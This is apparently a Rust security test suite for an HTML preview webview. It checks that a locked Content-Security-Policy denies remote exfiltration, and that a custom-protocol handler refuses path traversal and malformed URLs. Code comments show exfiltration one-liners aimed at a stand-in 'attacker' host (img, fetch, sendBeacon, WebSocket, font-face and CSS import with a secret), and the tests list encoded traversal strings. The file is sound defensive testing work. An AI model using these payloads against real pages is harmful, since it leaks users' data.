//! Preview security verification suite (lean scope, ADR-009/011 amended).
//!
//! Two boundaries, two mechanisms:
//!
//! 1. **Exfil denial is a CSP-semantics property.** A remote exfil request
//!    (`https://attacker/`, `wss://…`) never reaches the `writ-preview://`
//!    protocol handler — the webview's CSP enforcement blocks it before any
//!    network or protocol dispatch — so the disposition recorder cannot
//!    witness it. The boundary against exfil *is* the Content-Security-
//!    Policy. This suite asserts that the **locked** document CSP
//!    (`build_document_csp`) denies each of the six exfil vectors, using the
//!    independently-validated [`csp_eval`] evaluator (see its oracle tests).
//!
//! 2. **The scope/traversal boundary is what the recorder observes.** The
//!    handler genuinely receives `writ-preview://` URLs and decides
//!    chrome-vs-document routing and traversal refusal. Those dispositions
//!    are asserted via the debug-only request recorder against the real
//!    `resolve()` pipeline.
//!
//! The six malicious vectors are also recorded as a documented corpus that
//! seeds the `writ-preview://` URL-parser fuzz target and grounds the
//! threat model (`docs/security/html-preview.md`).

use writ_tauri_lib::preview::csp_eval::{Csp, Directive, Resource, Verdict};
use writ_tauri_lib::preview::csp::build_document_csp;
use writ_tauri_lib::preview::handler::{chrome_asset, resolve, RenderedDoc};
use writ_tauri_lib::preview::protocol::{clear_records, drain_records, Disposition, RefusalReason};

// --- 1. Exfil-denial suite: six vectors, denied by the locked CSP --------

/// Each exfil vector as the (directive, remote resource) a conformant
/// engine evaluates when the document attempts it. The doc comment names
/// the HTML/JS that triggers it — the documented fixture corpus.
struct ExfilVector {
    name: &'static str,
    directive: Directive,
    resource: Resource,
}

fn exfil_vectors() -> Vec<ExfilVector> {
    vec![
        // <img src="https://attacker/?secret">
        ExfilVector {
            name: "remote_img",
            directive: Directive::Img,
            resource: Resource::remote("https"),
        },
        // fetch('https://attacker/', { method: 'POST', body: secret })
        ExfilVector {
            name: "fetch",
            directive: Directive::Connect,
            resource: Resource::remote("https"),
        },
        // navigator.sendBeacon('https://attacker/', secret)
        ExfilVector {
            name: "send_beacon",
            directive: Directive::Connect,
            resource: Resource::remote("https"),
        },
        // new WebSocket('wss://attacker/')
        ExfilVector {
            name: "websocket",
            directive: Directive::Connect,
            resource: Resource::remote("wss"),
        },
        // @font-face { src: url('https://attacker/?secret') }
        ExfilVector {
            name: "remote_font_face",
            directive: Directive::Font,
            resource: Resource::remote("https"),
        },
        // <style>@import url('https://attacker/?secret')</style>
        ExfilVector {
            name: "remote_css_import",
            directive: Directive::Style,
            resource: Resource::remote("https"),
        },
    ]
}

#[test]
fn locked_csp_denies_every_exfil_vector_scripts_on() {
    let csp = Csp::parse(&build_document_csp(true));
    for v in exfil_vectors() {
        assert_eq!(
            csp.evaluate(v.directive, &v.resource),
            Verdict::Deny,
            "exfil vector `{}` must be denied under the locked CSP (scripts on)",
            v.name
        );
    }
}

#[test]
fn locked_csp_denies_every_exfil_vector_scripts_off() {
    // The kill switch only tightens script-src; the exfil directives
    // (connect/img/font/style remote) are denied either way.
    let csp = Csp::parse(&build_document_csp(false));
    for v in exfil_vectors() {
        assert_eq!(
            csp.evaluate(v.directive, &v.resource),
            Verdict::Deny,
            "exfil vector `{}` must be denied under the locked CSP (scripts off)",
            v.name
        );
    }
}

#[test]
fn http_is_denied_too_not_just_https() {
    // Network is categorically off — plaintext http is no more permitted
    // than https. (Belt-and-suspenders: the policy lists neither.)
    let csp = Csp::parse(&build_document_csp(true));
    assert_eq!(csp.evaluate(Directive::Img, &Resource::remote("http")), Verdict::Deny);
    assert_eq!(csp.evaluate(Directive::Connect, &Resource::remote("http")), Verdict::Deny);
    assert_eq!(csp.evaluate(Directive::Connect, &Resource::remote("ws")), Verdict::Deny);
}

// --- Allow class: the policy's *permitted* sources are permitted ---------
// A deny-everything evaluator would pass the deny class above and fail
// here. This is what makes the deny class meaningful.

#[test]
fn locked_csp_allows_its_permitted_local_sources() {
    let csp = Csp::parse(&build_document_csp(true));

    // Inline images via data: and local images via writ-preview:.
    assert_eq!(csp.evaluate(Directive::Img, &Resource::remote("data")), Verdict::Allow);
    assert_eq!(csp.evaluate(Directive::Img, &Resource::remote("writ-preview")), Verdict::Allow);

    // Fonts: data: and writ-preview:.
    assert_eq!(csp.evaluate(Directive::Font, &Resource::remote("data")), Verdict::Allow);
    assert_eq!(csp.evaluate(Directive::Font, &Resource::remote("writ-preview")), Verdict::Allow);

    // Author inline styles render (that's the whole point of preview).
    assert_eq!(csp.evaluate(Directive::Style, &Resource::Inline), Verdict::Allow);
}

#[test]
fn scripts_on_allows_inline_script_scripts_off_denies_it() {
    let on = Csp::parse(&build_document_csp(true));
    assert_eq!(on.evaluate(Directive::Script, &Resource::Inline), Verdict::Allow);
    assert_eq!(on.evaluate(Directive::Script, &Resource::remote("writ-preview")), Verdict::Allow);

    let off = Csp::parse(&build_document_csp(false));
    assert_eq!(off.evaluate(Directive::Script, &Resource::Inline), Verdict::Deny);
    assert_eq!(off.evaluate(Directive::Script, &Resource::remote("writ-preview")), Verdict::Deny);
}

#[test]
fn even_with_scripts_on_the_network_stays_shut() {
    // The defining property of the lean model: scripts run, but they have
    // no egress. A script that calls fetch() hits connect-src 'none'.
    let csp = Csp::parse(&build_document_csp(true));
    assert_eq!(csp.evaluate(Directive::Script, &Resource::Inline), Verdict::Allow);
    assert_eq!(csp.evaluate(Directive::Connect, &Resource::remote("https")), Verdict::Deny);
}

// --- 2. Scope/traversal boundary: what the recorder observes -------------

fn no_doc(_: &str) -> Option<RenderedDoc> {
    None
}

/// Drive a URL through the real resolve() pipeline and return its recorded
/// disposition. The recorder is the debug-build hook the handler writes to.
fn disposition_of(url: &str) -> Disposition {
    clear_records();
    let resolved = resolve(url, true, no_doc, chrome_asset);
    // resolve() itself doesn't record (serve() does); mirror serve()'s
    // record call so the suite exercises the same disposition the handler
    // would log.
    use writ_tauri_lib::preview::protocol::{record, RequestRecord};
    record(RequestRecord {
        url: url.to_string(),
        disposition: resolved.disposition.clone(),
    });
    let mut records = drain_records();
    assert_eq!(records.len(), 1, "exactly one disposition recorded for {url}");
    records.remove(0).disposition
}

#[test]
fn document_cannot_traverse_into_chrome_scope() {
    for url in [
        "writ-preview://document/../chrome/preview-base.css",
        "writ-preview://document/buf-1/../../chrome/preview-base.css",
        "writ-preview://document/%2e%2e/chrome/preview-base.css",
        "writ-preview://document/..\\chrome\\preview-base.css",
    ] {
        assert_eq!(
            disposition_of(url),
            Disposition::Refused(RefusalReason::TraversalAttempt),
            "traversal `{url}` must be refused",
        );
    }
}

#[test]
fn null_bytes_and_bad_encoding_are_refused() {
    assert_eq!(
        disposition_of("writ-preview://document/foo%00bar"),
        Disposition::Refused(RefusalReason::ProhibitedCharacter),
    );
    assert_eq!(
        disposition_of("writ-preview://document/foo%2"),
        Disposition::Refused(RefusalReason::InvalidEncoding),
    );
}

#[test]
fn foreign_schemes_and_unknown_scopes_are_refused() {
    assert_eq!(
        disposition_of("https://attacker/"),
        Disposition::Refused(RefusalReason::WrongScheme),
    );
    assert_eq!(
        disposition_of("writ-preview://attacker/x"),
        Disposition::Refused(RefusalReason::UnknownScope),
    );
}

#[test]
fn legitimate_chrome_and_document_requests_are_allowed() {
    // The boundary refuses crossings, not ordinary same-scope requests.
    assert_eq!(
        disposition_of("writ-preview://chrome/preview-base.css"),
        Disposition::Allowed,
    );
    assert_eq!(
        disposition_of("writ-preview://document/buf-1"),
        Disposition::Allowed,
    );
}
